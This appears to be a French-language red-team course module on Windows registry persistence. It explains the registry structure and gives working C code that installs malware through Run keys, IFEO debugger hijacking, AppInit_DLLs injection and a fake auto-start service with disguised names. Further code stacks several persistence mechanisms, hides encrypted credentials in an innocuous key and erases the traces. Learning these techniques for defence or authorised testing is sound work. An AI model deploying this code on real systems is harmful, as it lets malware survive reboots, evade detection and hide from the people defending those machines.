# 36 - Registry Persistence Windows

## 🎯 Ce que tu vas apprendre

- Comprendre la structure du registre Windows
- Utiliser le registre pour maintenir la persistence
- Masquer des données malveillantes dans le registre
- Bypasser les détections de persistence courantes
- Nettoyer ses traces dans le registre

## 📚 Théorie

### Concept 1 : Le Registre Windows

**C'est quoi ?**

Le **registre Windows** est une base de données hiérarchique centralisée qui stocke les configurations du système d'exploitation, des applications et des utilisateurs.

**Pourquoi ?**

Pour un attaquant, le registre est idéal pour la persistence car :
- Les clés peuvent s'exécuter automatiquement au démarrage
- Difficile à surveiller complètement (des milliers de clés)
- Privilèges utilisateur suffisants pour certaines clés
- Peu de détections sur les clés moins connues

**Comment ?**

Le registre est organisé en ruches (hives) avec une structure clé/valeur.

```ascii
HKEY_LOCAL_MACHINE (HKLM)    ← Configuration système
HKEY_CURRENT_USER (HKCU)     ← Configuration utilisateur
HKEY_CLASSES_ROOT (HKCR)     ← Associations fichiers
HKEY_USERS (HKU)             ← Tous les profils utilisateurs
HKEY_CURRENT_CONFIG          ← Configuration matérielle actuelle
```

### Concept 2 : Clés de Persistence Courantes

**C'est quoi ?**

Certaines clés du registre permettent d'**exécuter automatiquement** des programmes au démarrage de Windows ou lors de certains événements.

**Pourquoi ces clés ?**

Windows les lit à chaque démarrage et exécute les programmes spécifiés, garantissant que le malware survit aux redémarrages.

**Comment fonctionnent-elles ?**

On ajoute une valeur pointant vers notre payload malveillant.

```ascii
CLÉS RUN (les plus courantes) :

HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run

→ Exécuté pour tous les utilisateurs / utilisateur courant

HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
→ Exécuté une seule fois puis supprimé

HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
→ Exécuté en tant que service
```

### Concept 3 : Techniques Avancées de Persistence

**C'est quoi ?**

Des méthodes moins connues pour maintenir la persistence via le registre, plus difficiles à détecter.

**Pourquoi ?**

Les clés `Run` sont trop surveillées. Il faut utiliser des techniques alternatives.

**Comment ?**

- **Image File Execution Options (IFEO)** : Hijacker le démarrage d'un exécutable légitime
- **AppInit_DLLs** : Injecter une DLL dans tous les processus GUI
- **BootExecute** : S'exécuter avant le démarrage complet
- **Screensaver** : Hijacker l'économiseur d'écran
- **Winlogon Notify** : Hook sur les événements de login

## 🔍 Visualisation

```ascii
PERSISTENCE VIA REGISTRE - Workflow

1. ACCÈS INITIAL
   └─> Exploit / Phishing / Malware

2. INSTALLATION PERSISTENCE
   ┌─────────────────────────────────────┐
   │ Écrire dans le registre :           │
   │ HKCU\...\Run                        │
   │ Valeur: "Updater"                   │
   │ Data: "C:\Temp\malware.exe"         │
   └─────────────────────────────────────┘

3. REDÉMARRAGE WINDOWS
   Windows lit la clé Run au boot
   ↓
   Exécute C:\Temp\malware.exe

4. MALWARE RELANCÉ
   └─> Connection au C2, exfiltration, etc.

STRUCTURE DU REGISTRE

HKEY_LOCAL_MACHINE
├─ SOFTWARE
│  ├─ Microsoft
│  │  ├─ Windows
│  │  │  ├─ CurrentVersion
│  │  │  │  ├─ Run               ← PERSISTENCE
│  │  │  │  ├─ RunOnce           ← PERSISTENCE
│  │  │  │  └─ Policies
│  │  │  └─ NT
│  │  │     └─ CurrentVersion
│  │  │        └─ Winlogon        ← PERSISTENCE
│  │  └─ Windows NT
│  │     └─ CurrentVersion
│  │        └─ Image File Execution Options  ← IFEO HIJACK
│  └─ Classes
│     └─ .exe                     ← FILE ASSOCIATION
└─ SYSTEM
   └─ CurrentControlSet
      ├─ Services                 ← SERVICES MALVEILLANTS
      └─ Control
         └─ Session Manager       ← BootExecute

CLÉS DE PERSISTENCE PAR PRIVILÈGE REQUIS

┌────────────────────────────┬──────────────┬─────────────────┐
│ Clé                        │ Privilège    │ Détection       │
├────────────────────────────┼──────────────┼─────────────────┤
│ HKCU\...\Run               │ Utilisateur  │ Élevée          │
│ HKLM\...\Run               │ Admin        │ Élevée          │
│ HKLM\...\RunOnce           │ Admin        │ Moyenne         │
│ IFEO Hijack                │ Admin        │ Faible          │
│ AppInit_DLLs               │ Admin        │ Moyenne         │
│ Services                   │ SYSTEM       │ Faible (si nom légitime)│
│ BootExecute                │ SYSTEM       │ Très faible     │
└────────────────────────────┴──────────────┴─────────────────┘
```

## 💻 Exemple pratique

### Exemple 1 : Run Key Basique

```c
#include <windows.h>
#include <stdio.h>

BOOL add_run_key(LPCSTR name, LPCSTR path) {
    HKEY hKey;
    LONG result;

    // Ouvrir la clé Run
    result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        printf("[-] Erreur RegOpenKeyEx: %ld\n", result);
        return FALSE;
    }

    // Ajouter la valeur
    result = RegSetValueExA(
        hKey,
        name,
        0,
        REG_SZ,
        (BYTE*)path,
        (DWORD)strlen(path) + 1
    );

    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        printf("[+] Persistence ajoutée: %s -> %s\n", name, path);
        return TRUE;
    } else {
        printf("[-] Erreur RegSetValueEx: %ld\n", result);
        return FALSE;
    }
}

int main() {
    char malware_path[MAX_PATH];
    GetModuleFileNameA(NULL, malware_path, MAX_PATH);

    add_run_key("WindowsUpdate", malware_path);

    return 0;
}
```

### Exemple 2 : IFEO Hijacking (Debugger Trick)

Détourner le lancement d'un exécutable légitime.

```c
#include <windows.h>
#include <stdio.h>

BOOL ifeo_hijack(LPCSTR target_exe, LPCSTR malware_path) {
    HKEY hKey;
    LONG result;
    char key_path[256];

    // Construire le chemin de la clé IFEO
    snprintf(key_path, sizeof(key_path),
             "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s",
             target_exe);

    // Créer/Ouvrir la clé
    result = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        key_path,
        0, NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        NULL
    );

    if (result != ERROR_SUCCESS) {
        printf("[-] Erreur RegCreateKeyEx: %ld\n", result);
        return FALSE;
    }

    // Définir le Debugger
    result = RegSetValueExA(
        hKey,
        "Debugger",
        0,
        REG_SZ,
        (BYTE*)malware_path,
        (DWORD)strlen(malware_path) + 1
    );

    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        printf("[+] IFEO Hijack: %s -> %s\n", target_exe, malware_path);
        return TRUE;
    } else {
        printf("[-] Erreur RegSetValueEx: %ld\n", result);
        return FALSE;
    }
}

int main() {
    // Quand notepad.exe sera lancé, notre malware s'exécutera à la place
    ifeo_hijack("notepad.exe", "C:\\Temp\\malware.exe");
    return 0;
}
```

### Exemple 3 : AppInit_DLLs Injection

Injecter une DLL dans tous les processus qui chargent user32.dll.

```c
#include <windows.h>
#include <stdio.h>

BOOL appinit_persistence(LPCSTR dll_path) {
    HKEY hKey;
    LONG result;
    DWORD value = 1;

    // Ouvrir la clé AppInit
    result = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
        0,
        KEY_WRITE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        printf("[-] Erreur RegOpenKeyEx: %ld\n", result);
        return FALSE;
    }

    // Définir la DLL
    RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ,
                   (BYTE*)dll_path, (DWORD)strlen(dll_path) + 1);

    // Activer LoadAppInit_DLLs
    RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD,
                   (BYTE*)&value, sizeof(value));

    RegCloseKey(hKey);

    printf("[+] AppInit_DLLs persistence installée\n");
    return TRUE;
}

int main() {
    appinit_persistence("C:\\Temp\\evil.dll");
    return 0;
}
```

### Exemple 4 : Service Registry Persistence

```c
#include <windows.h>
#include <stdio.h>

BOOL create_malicious_service_via_registry(LPCSTR service_name, LPCSTR display_name, LPCSTR exe_path) {
    HKEY hKey;
    LONG result;
    char key_path[256];
    DWORD start_type = 2;  // SERVICE_AUTO_START
    DWORD service_type = 0x10;  // SERVICE_WIN32_OWN_PROCESS

    // Créer la clé service
    snprintf(key_path, sizeof(key_path),
             "SYSTEM\\CurrentControlSet\\Services\\%s", service_name);

    result = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        key_path,
        0, NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        NULL
    );

    if (result != ERROR_SUCCESS) {
        return FALSE;
    }

    // Définir les valeurs
    RegSetValueExA(hKey, "DisplayName", 0, REG_SZ,
                   (BYTE*)display_name, (DWORD)strlen(display_name) + 1);

    RegSetValueExA(hKey, "ImagePath", 0, REG_EXPAND_SZ,
                   (BYTE*)exe_path, (DWORD)strlen(exe_path) + 1);

    RegSetValueExA(hKey, "Start", 0, REG_DWORD,
                   (BYTE*)&start_type, sizeof(start_type));

    RegSetValueExA(hKey, "Type", 0, REG_DWORD,
                   (BYTE*)&service_type, sizeof(service_type));

    RegCloseKey(hKey);

    printf("[+] Service malveillant créé: %s\n", service_name);
    return TRUE;
}

int main() {
    create_malicious_service_via_registry(
        "WindowsUpdateService",
        "Windows Update Service",
        "C:\\Temp\\malware.exe"
    );
    return 0;
}
```

## 🎯 Application Red Team

### Scénario 1 : Persistence Multi-Clés

Installer plusieurs mécanismes de persistence pour garantir la survie.

```c
void install_multi_persistence(LPCSTR malware_path) {
    // 1. HKCU Run (privilèges utilisateur)
    add_run_key("OneDriveSync", malware_path);

    // 2. HKLM Run (si admin)
    HKEY hKey;
    if (RegOpenKeyExA(HKLM, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SecurityUpdate", 0, REG_SZ,
                      (BYTE*)malware_path, strlen(malware_path) + 1);
        RegCloseKey(hKey);
    }

    // 3. IFEO Hijack sur calc.exe
    ifeo_hijack("calc.exe", malware_path);

    // 4. Screensaver hijack
    RegOpenKeyExA(HKCU, "Control Panel\\Desktop", 0, KEY_WRITE, &hKey);
    RegSetValueExA(hKey, "SCRNSAVE.EXE", 0, REG_SZ,
                  (BYTE*)malware_path, strlen(malware_path) + 1);
    RegCloseKey(hKey);

    printf("[+] Persistence multi-couches installée\n");
}
```

### Scénario 2 : Cacher des Credentials dans le Registre

```c
#include <windows.h>
#include <wincrypt.h>

void hide_credentials_in_registry() {
    HKEY hKey;
    DATA_BLOB input, output;
    BYTE credentials[] = "admin:P@ssw0rd123";

    // Chiffrer avec DPAPI
    input.pbData = credentials;
    input.cbData = sizeof(credentials);

    if (CryptProtectData(&input, L"Config", NULL, NULL, NULL,
                        0, &output)) {

        // Stocker dans une clé anodine
        RegCreateKeyExA(HKLM,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);

        RegSetValueExA(hKey, "UserCache", 0, REG_BINARY,
                      output.pbData, output.cbData);

        RegCloseKey(hKey);
        LocalFree(output.pbData);

        printf("[+] Credentials cachés dans le registre\n");
    }
}
```

### Scénario 3 : Nettoyer la Persistence

```c
void cleanup_persistence() {
    HKEY hKey;

    // Supprimer de Run
    if (RegOpenKeyExA(HKCU, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "OneDriveSync");
        RegCloseKey(hKey);
    }

    // Supprimer IFEO
    RegDeleteTreeA(HKLM,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe");

    // Supprimer service
    RegDeleteTreeA(HKLM, "SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService");

    printf("[+] Persistence nettoyée\n");
}
```

## 📝 Points clés

1. **Registre = base de données de configuration** Windows, idéale pour persistence
2. **Run keys** = méthode la plus simple mais très surveillée
3. **IFEO Hijacking** = détourner l'exécution d'un exe légitime
4. **AppInit_DLLs** = injection globale dans tous les processus GUI
5. **Multi-persistence** = installer plusieurs mécanismes pour garantir survie
6. **Nettoyage** = toujours prévoir une fonction pour effacer les traces

## ➡️ Prochaine étape

Module 37 : **Linux Syscalls** - Appels système directs sous Linux pour bypasser libc et éviter les hooks.
